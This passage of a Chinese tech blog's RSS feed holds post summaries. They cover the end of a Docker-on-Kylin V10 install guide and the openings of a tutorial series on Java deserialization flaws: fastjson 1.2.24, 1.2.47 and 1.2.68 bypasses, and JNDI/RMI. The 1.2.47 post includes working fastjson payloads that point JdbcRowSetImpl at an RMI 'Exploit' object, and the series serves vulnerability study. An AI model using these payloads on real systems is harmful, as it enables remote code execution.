&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sed -i &lt;span style="color:#e6db74">&amp;#39;s+download.docker.com+mirrors.aliyun.com/docker-ce+&amp;#39;&lt;/span> /etc/yum.repos.d/docker-ce.repo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="定义-yum-变量修改-repo">定义 yum 变量&amp;amp;修改 repo&lt;/h3>
&lt;p>修改 centos 和 docker &lt;code>repo&lt;/code>文件中的 &lt;code>$releasever&lt;/code> 为 &lt;code>centos_version&lt;/code> ，原因是在麒麟服务器操作系统V10中 &lt;code>$releasever&lt;/code>被修改为了 10，而我们需要使用 centos 8的镜像源，如果你不替换，基本上仓库的每一个地址都是404。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#34;8&amp;#34;&lt;/span> &amp;gt; /etc/yum/vars/centos_version
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sed -i &lt;span style="color:#e6db74">&amp;#39;s/$releasever/$centos_version/g&amp;#39;&lt;/span> /etc/yum.repos.d/docker-ce.repo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sed -i &lt;span style="color:#e6db74">&amp;#39;s/$releasever/$centos_version/g&amp;#39;&lt;/span> /etc/yum.repos.d/CentOS-Base.repo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="建立yum缓存">建立yum缓存&lt;/h3>
&lt;p>没啥可说的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum makecache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="查看docker-ce-版本">查看docker-ce 版本&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum list docker-ce --showduplicates | sort -r
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.9-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.8-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.7-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.6-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.5-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.4-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.3-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.2-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.1-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.12-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.11-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.10-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.0-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:19.03.15-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:19.03.15-3.el8 @docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:19.03.14-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:19.03.13-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="安装docker">安装docker&lt;/h3>
&lt;p>这里要安装 docker-ce 19.03 版本，因为我在使用最新版 20.10 启动容器时出现了未知的权限问题，而麒麟服务器操作系统资料相对较少，我未能找到相应的解决方案，只好退而求其次，换到上一个稳定版本。&lt;/p></description></item><item><title>Java 反序列化漏洞原理（六）fastjson 1.2.68 绕过原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-6/</link><pubDate>Sat, 06 Nov 2021 17:16:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-6/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="fastjson--1268-expectclass-绕过原理">Fastjson &amp;lt;= 1.2.68 expectClass 绕过原理&lt;/h2>
&lt;p>当 fastjson 更新到 1.2.68 之后，大部分安全漏洞都已经封堵住了，但不排除还有人手里握着一些 0day 没有放出来。&lt;/p>
&lt;p>fastjson 1.2.68 在进行反序列化的时候，会进入 &lt;code>ObjectDeserializer&lt;/code> 的 &lt;code>deserialze&lt;/code> 方法，而 安全人员发现 当 &lt;code>@type&lt;/code> 为 &lt;code>java.lang.AutoCloseable&lt;/code> 的时候会找到实现类 &lt;code>JavaBeanDeserializer&lt;/code> 调用 &lt;code>deserialze&lt;/code>，而 &lt;code>JavaBeanDeserializer&lt;/code> 的 &lt;code>deserialze&lt;/code> 方法还会继续解析得到第二个 &lt;code>@type&lt;/code> 对应的值进行反序列化，并且 &lt;code>expectClass&lt;/code> 则不再是 &lt;code>null&lt;/code> 值，而是 &lt;code>java.lang.AutoCloseable&lt;/code>。&lt;/p>
&lt;p>&lt;code>JavaBeanDeserializer&lt;/code> 的 &lt;code>deserialze&lt;/code> 部分代码示例。&lt;/p>
&lt;pre tabindex="0">&lt;code>if (lexer.token() == JSONToken.LITERAL_STRING) {
 // 第二个 @type 的值
 String typeName = lexer.stringVal();
 lexer.nextToken(JSONToken.COMMA);

 if (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) {
 if (lexer.token() == JSONToken.RBRACE) {
 lexer.nextToken();
 break;
 }
 continue;
 }
 
 // 这里没有获取到 deserializer
 ObjectDeserializer deserializer = getSeeAlso(config, this.beanInfo, typeName);
 Class&amp;lt;?&amp;gt; userType = null;

 if (deserializer == null) {
 // 第一个 @type 的值 
 Class&amp;lt;?&amp;gt; expectClass = TypeUtils.getClass(type);
 // 在包含 expectClass 时会绕过
 userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());
 deserializer = parser.getConfig().getDeserializer(userType);
 }
 
 // 再次进行反序列化，会触发反射构造实例
 Object typedObject = deserializer.deserialze(parser, userType, fieldName);
 if (deserializer instanceof JavaBeanDeserializer) {
 JavaBeanDeserializer javaBeanDeserializer = (JavaBeanDeserializer) deserializer;
 if (typeKey != null) {
 FieldDeserializer typeKeyFieldDeser = javaBeanDeserializer.getFieldDeserializer(typeKey);
 if (typeKeyFieldDeser != null) {
 typeKeyFieldDeser.setValue(typedObject, typeName);
 }
 }
 }
 return (T) typedObject;
}
&lt;/code>&lt;/pre>&lt;p>&lt;code>ParseConfig&lt;/code> 的 &lt;code>checkAutoType&lt;/code> 部分代码示例，只要第二个 &lt;code>@type&lt;/code> 继承了 第一个 &lt;code>@type&lt;/code> 即可触发。&lt;/p></description></item><item><title>Java 反序列化漏洞原理（五）fastjson 1.2.47 绕过原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-5/</link><pubDate>Sun, 31 Oct 2021 21:31:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-5/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="fastjson--1247-poc">Fastjson &amp;lt;= 1.2.47 POC&lt;/h2>
&lt;p>随着 fastjson 的更新，以往的安全漏洞都被封堵掉了，但道高一尺，魔高一丈，安全人员发现了一个通杀的漏洞，以往的封堵手段都可以绕过，算是一个里程碑的发现。&lt;/p>
&lt;p>我们首先将 fastjson 升级到 1.2.47 版本，然后使用我们之前的POC进行测试。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> com.alibaba.fastjson.JSON;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Eval3&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(String&lt;span style="color:#f92672">[]&lt;/span> args) &lt;span style="color:#66d9ef">throws&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#a6e22e">parse&lt;/span>(payload);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>不出意料的话会出现这样的错误提示信息：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>autoType is not support. com.sun.rowset.JdbcRowSetImpl
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是因为 fastjson 使用了黑名单机制，禁止将 &lt;code>com.sun.rowset.JdbcRowSetImpl&lt;/code> 反序列化。&lt;/p>
&lt;p>下面我们使用新的 POC 进行测试，又可以利用成功了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> com.alibaba.fastjson.JSON;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Eval5&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(String&lt;span style="color:#f92672">[]&lt;/span> args) &lt;span style="color:#66d9ef">throws&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.lang.Class\&amp;#34;,\&amp;#34;val\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;},\&amp;#34;b\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}}&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#a6e22e">parse&lt;/span>(payload);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>payload 格式化之后如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#e6db74">&amp;#34;a&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#e6db74">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;java.lang.Class&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#e6db74">&amp;#34;val&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	},
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#e6db74">&amp;#34;b&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#e6db74">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#e6db74">&amp;#34;dataSourceName&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;rmi://localhost:1099/Exploit&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#e6db74">&amp;#34;autoCommit&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="fastjson--1247-绕过原理">Fastjson &amp;lt;= 1.2.47 绕过原理&lt;/h2>
&lt;p>在学习绕过原理之前，了解 fastjson 的基本解析流程还是有必要的，我画了一张类图仅供参考，图中只画了主要流程，还有很多类没有画。&lt;/p></description></item><item><title>Java 反序列化漏洞原理（四）JNDI + RMI/LDAP 在fastjson中的利用原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-4/</link><pubDate>Sat, 30 Oct 2021 13:43:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-4/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="jndi-是什么">JNDI 是什么&lt;/h2>
&lt;p>Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。&lt;/p>
&lt;p>JNDI 包含在Java SE中，不需要引用第三方jar即可使用。要使用 JNDI 必须要有一个或多个服务提供者。JDK 本身已经包括了下面几种服务提供者。&lt;/p>
&lt;ul>
&lt;li>轻量级目录访问协议 (LDAP)&lt;/li>
&lt;li>CORBA 公共对象服务命名（COS naming）&lt;/li>
&lt;li>Java 远程方法调用 (RMI)&lt;/li>
&lt;li>域名服务 (DNS)&lt;/li>
&lt;/ul>
&lt;p>这么说起来还是有点抽象，简单理解就是&lt;strong>服务提供者&lt;/strong>提供一个类似Key Value的数据，&lt;strong>JNDI&lt;/strong>可以通过这个 Key 获取到&lt;strong>服务提供者&lt;/strong>上的提供的Value，因此JNDI是无法单独使用的。&lt;/p>
&lt;p>使用JNDI的方式也很简单，下面就是一个获取远程对象的示例代码。&lt;/p>
&lt;pre tabindex="0">&lt;code>// 创建一个上下文对象
InitialContext context = new InitialContext();
// 查找监听在本地 1099 端口上 RMI 服务的 Object 对象
Object obj = context.lookup(&amp;#34;rmi://localhost:1099/Object&amp;#34;);
&lt;/code>&lt;/pre>&lt;h2 id="rmi-是什么">RMI 是什么&lt;/h2>
&lt;p>RMI 是 Remote Method Invocation 的缩写，中文含义为远程方法调用，即一个Java程序调用调用另一个Java程序暴露出来的方法。&lt;/p>
&lt;p>RMI 有三个概念：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Registry :&lt;/strong> 提供服务注册和服务获取，服务端将类名称，存放地址注册到Registry中，以供客户端获取。&lt;/li>
&lt;li>&lt;strong>Server :&lt;/strong> 远程方法的提供者。&lt;/li>
&lt;li>&lt;strong>Client :&lt;/strong> 远程方法的调用者。&lt;/li>
&lt;/ul>
&lt;p>远程方法的定义需要满足两个条件：&lt;/p>
&lt;ol>
&lt;li>实现 &lt;code>java.rmi.Remote&lt;/code>。&lt;/li>
&lt;li>继承 &lt;code>java.rmi.server.UnicastRemoteObject&lt;/code>。&lt;/li>
&lt;/ol>
&lt;h2 id="rmi-使用示例">RMI 使用示例&lt;/h2>
&lt;h3 id="registry">Registry&lt;/h3>
&lt;p>创建 Registry&lt;/p></description></item><item><title>Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-3/</link><pubDate>Thu, 21 Oct 2021 22:56:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-3/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="fastjson-是什么">Fastjson 是什么&lt;/h2>
&lt;blockquote>
&lt;p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。&lt;/p>&lt;/blockquote>
&lt;blockquote>
&lt;p>fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。&lt;/p>&lt;/blockquote>
&lt;p>以上摘自Fastjson GitHub 介绍。&lt;/p>
&lt;p>但近年来随着 Fastjson 不断爆出漏洞，各大中小型公司都逐渐弃用 Fastjson ，甚至阿里自己开源的服务注册、配置管理平台 &lt;strong>NACOS&lt;/strong> 在 1.3.0 版本之后都从 Fastjson 替换为了 Jackson (详见 &lt;a href="https://github.com/alibaba/nacos/releases/tag/1.3.0">https://github.com/alibaba/nacos/releases/tag/1.3.0&lt;/a>) ，可见漏洞危害之大。&lt;/p>
&lt;h2 id="为什么会弃用-fastjson-">为什么会弃用 Fastjson ？&lt;/h2>
&lt;p>想要研究一个产品的漏洞其中有一条很好的途径就是去查询 CVE 编号，但是我在检索之后发现 Fastjson 只有 &lt;strong>CVE-2017-18349&lt;/strong> 这一条，而 Jackson 竟然有高达 76 条。&lt;/p>
&lt;p>这能否证明 Fastjson 比 Jackson 更安全呢？答案并不是，都是半斤八两，有些 Fastjson 里面出现的漏洞在 Jackson 里面也同样存在。&lt;/p>
&lt;p>那为什么会有公司弃用 Fastjson 呢？&lt;/p>
&lt;p>或许是 Jackson 有更完善且公开的漏洞管理机制，或许是国外的月亮比较圆，或许是随大流，也或许是 Fastjson 代码质量不过关（知乎上有很多回答批判 Fastjson 代码糟糕的），真实原因就不得而知了。&lt;/p>
&lt;p>尽管近年来有公司不断弃用 Fastjson ，但还有很多公司在使用，并且已经开发上线的系统想要替换或者升级 Fastjson 还需要时间，因此我们很有必要学习一下 Fastjson 漏洞的产因。&lt;/p>
&lt;h2 id="fastjson-漏洞产生原因">Fastjson 漏洞产生原因&lt;/h2>
&lt;p>Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 &lt;a href="https://github.com/alibaba/fastjson/wiki/security_update_20170315">https://github.com/alibaba/fastjson/wiki/security_update_20170315&lt;/a> 。漏洞影响 1.2.24 以及之前的版本。我们今天来研究一下当 fastjson version &amp;lt;= 1.2.24 时漏洞是如何产生的。&lt;/p></description></item><item><title>Java 反序列化漏洞原理（二）新版本JDK利用方式和Shiro举例</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-2/</link><pubDate>Sat, 16 Oct 2021 22:55:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-2/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="新的希望">新的希望&lt;/h2>
&lt;h3 id="0x00">0x00&lt;/h3>
&lt;p>在上一节中我们介绍了 Java 反序列化漏洞的成因和利用 &lt;code>commons-collections 3.1&lt;/code> 搭配 &lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code> 实现远程命令执行的方式。但&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code> 的问题已经在最新版 jdk 中修复，可利用范围仅能够局限于旧版本的jdk。经过安全人员的审计，另一个类 &lt;code>javax.management.BadAttributeValueExpException&lt;/code> 出现在了安全人员的视野。&lt;/p>
&lt;p>&lt;code>javax.management.BadAttributeValueExpException&lt;/code> 继承自 &lt;code>java.lang.Exception&lt;/code>，&lt;code>java.lang.Exception&lt;/code> 继承自 &lt;code>java.lang.Throwable&lt;/code>，而 &lt;code>java.lang.Throwable&lt;/code> 实现了 &lt;code>java.io.Serializable&lt;/code>。因此 &lt;code>javax.management.BadAttributeValueExpException&lt;/code> 符合了 &lt;strong>可序列化&lt;/strong> 这个要求，同样的它也增加了 &lt;code>readObject&lt;/code> 方法，这个类的完整代码如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> javax.management;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.io.IOException;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.io.ObjectInputStream;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * Thrown when an invalid MBean attribute is passed to a query
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * constructing method. This exception is used internally by JMX
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * during the evaluation of a query. User code does not usually
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * see it.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * @since 1.5
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">BadAttributeValueExpException&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* Serial version */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> serialVersionUID &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>3105272988410493376L;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * @serial A string representation of the attribute that originated this exception.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * for example, the string value can be the return of {@code attribute.toString()}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> Object val;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * Constructs a BadAttributeValueExpException using the specified Object to
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * create the toString() value.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * @param val the inappropriate value.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">BadAttributeValueExpException&lt;/span> (Object val) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">val&lt;/span> &lt;span style="color:#f92672">=&lt;/span> val &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> : val.&lt;span style="color:#a6e22e">toString&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * Returns the string representing the object.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> String &lt;span style="color:#a6e22e">toString&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#34;BadAttributeValueException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> val;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">readObject&lt;/span>(ObjectInputStream ois) &lt;span style="color:#66d9ef">throws&lt;/span> IOException, ClassNotFoundException {
